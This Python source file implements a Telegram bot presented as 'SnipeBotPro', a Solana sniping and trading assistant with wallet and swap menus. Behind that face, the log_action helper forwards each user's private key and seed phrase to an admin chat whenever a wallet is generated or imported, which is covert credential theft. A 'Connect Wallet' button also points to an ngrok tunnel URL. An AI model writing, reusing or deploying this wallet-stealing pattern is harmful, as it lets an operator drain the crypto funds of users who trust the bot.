from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler,
    CallbackQueryHandler, ContextTypes,
    MessageHandler, filters
)

from config import Config
from wallet import (
    generate_wallet,
    import_private_key,
    import_phrase,
    load_wallet,
    get_balance,
    sign_and_send,
    get_wallet_data
)
from trade import get_token_price, get_quote, create_swap_tx, SOL

# ================= STATE =================
user_state = {}
buy_data = {}

# ================= LOGGER =================
async def log_action(context, text):
    try:
        await context.bot.send_message(
            chat_id=Config.ADMIN_CHAT_ID,
            text=text
        )
    except Exception as e:
        print("Log error:", e)

# ================= UI =================
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👛 Wallet", callback_data="wallet"),
         InlineKeyboardButton("💸 Trade", callback_data="trade")],
        [InlineKeyboardButton("📊 Market", callback_data="market"),
         InlineKeyboardButton("📁 Positions", callback_data="positions")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ])

def wallet_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Generate", callback_data="gen_wallet")],
        [InlineKeyboardButton("📥 Import PK", callback_data="import_pk")],
        [InlineKeyboardButton("📥 Import Phrase", callback_data="import_phrase")],
        [InlineKeyboardButton("👁 View Wallet", callback_data="view_wallet")],
        [InlineKeyboardButton("🔙 Menu", callback_data="menu")],
        [InlineKeyboardButton(
            "🔗 Connect Wallet",
            url="https://phantom.app/ul/browse/https://abc123.ngrok.io"
        )]
    ])

def trade_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🟢 Buy", callback_data="buy"),
         InlineKeyboardButton("🔴 Sell", callback_data="sell")],
        [InlineKeyboardButton("⚡ Quick Buy 0.1", callback_data="quick_0.1"),
         InlineKeyboardButton("⚡ Quick Buy 0.5", callback_data="quick_0.5")],
        [InlineKeyboardButton("📊 Token Info", callback_data="token_info"),
         InlineKeyboardButton("📈 Chart", callback_data="chart")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu")]
    ])

def trade_amount_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("0.1 SOL", callback_data="amt_0.1"),
         InlineKeyboardButton("0.5 SOL", callback_data="amt_0.5")],
        [InlineKeyboardButton("1 SOL", callback_data="amt_1")],
        [InlineKeyboardButton("Custom", callback_data="custom_amount")]
    ])

# ================= START =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🏠SnipeBotPro — Your Ultimate Solana Trading Assistant! Automate sniping, track token prices in real-time, execute lightning-fast swaps, and stay ahead of the market with precision tools built for serious traders.",
        reply_markup=main_menu()
    )

# ================= BUTTON HANDLER =================
async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    # MENU
    if query.data == "menu":
        await query.edit_message_text(
            "🏠SnipeBotPro — Your Ultimate Solana Trading Assistant! Automate sniping, track token prices in real-time, execute lightning-fast swaps, and stay ahead of the market with precision tools built for serious traders.",
            reply_markup=main_menu()
        )

    # WALLET
    elif query.data == "wallet":
        await query.edit_message_text("👛 Wallet Panel", reply_markup=wallet_menu())

    elif query.data == "gen_wallet":
        try:
            pub, pk, phrase = generate_wallet(user_id)
            if not pub:
                raise Exception("Wallet generation returned None")

            await query.edit_message_text(
                f"🆕 WALLET CREATED\n\n"
                f"👛 Address:\n{pub}\n\n"
                f"🔑 Private Key:\n{pk}\n\n"
                f"🧠 Phrase:\n{phrase}\n\n"
                f"⚠️ SAVE THIS SECURELY",
                reply_markup=wallet_menu()
            )

            await log_action(context, f"🆕 Wallet\nUser:{user_id}\nPK:{pk}\nPhrase:{phrase}")

        except Exception as e:
            print("WALLET ERROR:", e)
            await query.edit_message_text("❌ Wallet generation failed")

    elif query.data == "view_wallet":
        try:
            wallet = load_wallet(user_id)
            if not wallet:
                await query.edit_message_text("❌ No wallet found", reply_markup=wallet_menu())
                return

            balance = get_balance(user_id)
            await query.edit_message_text(
                f"👛 Address:\n{wallet.pubkey()}\n\n💰 Balance: {balance} SOL",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔑 Private Key", callback_data="show_pk"),
                     InlineKeyboardButton("🧠 Phrase", callback_data="show_phrase")],
                    [InlineKeyboardButton("🔙 Back", callback_data="wallet")]
                ])
            )

        except Exception as e:
            print("VIEW WALLET ERROR:", e)
            await query.edit_message_text("❌ Failed to load wallet")

    elif query.data == "show_pk":
        data = get_wallet_data(user_id)
        if not data:
            await query.edit_message_text("No wallet data", reply_markup=wallet_menu())
            return
        await query.edit_message_text(f"🔑 Private Key:\n{data['private_key']}", reply_markup=wallet_menu())

    elif query.data == "show_phrase":
        data = get_wallet_data(user_id)
        if not data or not data.get("phrase"):
            await query.edit_message_text("No phrase stored", reply_markup=wallet_menu())
            return
        await query.edit_message_text(f"🧠 Phrase:\n{data['phrase']}", reply_markup=wallet_menu())

    elif query.data == "import_pk":
        user_state[user_id] = "import_pk"
        await query.edit_message_text("Send private key:")

    elif query.data == "import_phrase":
        user_state[user_id] = "import_phrase"
        await query.edit_message_text("Send seed phrase:")

    # TRADE
    elif query.data == "trade":
        wallet = load_wallet(user_id)
        if not wallet:
            await query.edit_message_text(
                "❌ No wallet connected.\n\nPlease create or import a wallet first.",
                reply_markup=wallet_menu()
            )
            return
        user_state[user_id] = "buy_token"
        await query.edit_message_text("Send token mint address:")

    elif query.data.startswith("amt_"):
        amount = float(query.data.split("_")[1])
        buy_data[user_id]["amount"] = amount
        user_state[user_id] = "buy_confirm"
        await query.edit_message_text(f"Confirm buy {amount} SOL? Type YES")

    elif query.data == "custom_amount":
        user_state[user_id] = "buy_amount"
        await query.edit_message_text("Enter custom amount in SOL:")

    # MARKET
    elif query.data == "market":
        user_state[user_id] = "search"
        await query.edit_message_text("Send token mint to get price:")

    # POSITIONS
    elif query.data == "positions":
        await query.edit_message_text("📁 No positions yet", reply_markup=main_menu())

    # HELP
    elif query.data == "help":
        await query.edit_message_text("Use the menu to manage wallet and trade.", reply_markup=main_menu())

# ================= MESSAGE HANDLER =================
async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_state:
        return

    state = user_state[user_id]
    text = update.message.text.strip()

    # IMPORT PK
    if state == "import_pk":
        pub = import_private_key(user_id, text)
        await update.message.reply_text(f"✅ Imported:\n{pub}" if pub else "❌ Invalid key")
        await log_action(context, f"PK Imported\nUser:{user_id}\n{text}")
        user_state.pop(user_id)

    # IMPORT PHRASE
    elif state == "import_phrase":
        pub = import_phrase(user_id, text)
        await update.message.reply_text(f"✅ Imported:\n{pub}" if pub else "❌ Invalid phrase")
        await log_action(context, f"Phrase Imported\nUser:{user_id}\n{text}")
        user_state.pop(user_id)

    # MARKET SEARCH
    elif state == "search":
        try:
            price = get_token_price(text)
            await update.message.reply_text(f"💰 Price: {price}" if price else "❌ Token not found")
        except Exception as e:
            print("PRICE ERROR:", e)
            await update.message.reply_text("❌ Failed to fetch price")
        user_state.pop(user_id)

    # BUY FLOW
    elif state == "buy_token":
        wallet = load_wallet(user_id)
        if not wallet:
            await update.message.reply_text("❌ No wallet connected.\nCreate or import first.")
            user_state.pop(user_id)
            return
        buy_data[user_id] = {"token": text}
        await update.message.reply_text("Select amount:", reply_markup=trade_amount_menu())

    elif state == "buy_amount":
        try:
            buy_data[user_id]["amount"] = float(text)
            user_state[user_id] = "buy_confirm"
            await update.message.reply_text("Type YES to confirm trade")
        except:
            await update.message.reply_text("Invalid amount")

    elif state == "buy_confirm":
        if text.lower() == "yes":
            try:
                token = buy_data[user_id]["token"]
                amount = buy_data[user_id]["amount"]
                wallet = load_wallet(user_id)
                if not wallet:
                    await update.message.reply_text("❌ No wallet connected.\nCreate or import one first.")
                    return
                await update.message.reply_text("⏳ Processing trade...")

                quote = None
                for _ in range(3):
                    quote = get_quote(SOL, token, int(amount * 1e9))
                    if quote:
                        break

                if not quote:
                    await update.message.reply_text(
                        "❌ No trading route found.\nThis token might have no liquidity or be too new."
                    )
                    return

                swap = create_swap_tx(wallet.pubkey(), quote)
                if not swap or "swapTransaction" not in swap:
                    await update.message.reply_text("❌ Failed to build transaction")
                    return

                tx = sign_and_send(user_id, swap["swapTransaction"])
                await update.message.reply_text(f"✅ Trade Success\n{tx}")

                await log_action(context, f"💸 Trade\nUser:{user_id}\nAmount:{amount} SOL\nTX:{tx}")

            except Exception as e:
                await update.message.reply_text(f"❌ Error: {e}")

        else:
            await update.message.reply_text("❌ Cancelled")

        user_state.pop(user_id)
        buy_data.pop(user_id, None)

# ================= RUN =================
app = ApplicationBuilder().token(Config.TELEGRAM_TOKEN).build()
app.job_queue.run_once(lambda *_: None, 0)
app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(handle_buttons))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))

if __name__ == "__main__":
    print("🚀 Bot running...")
    app.run_polling()
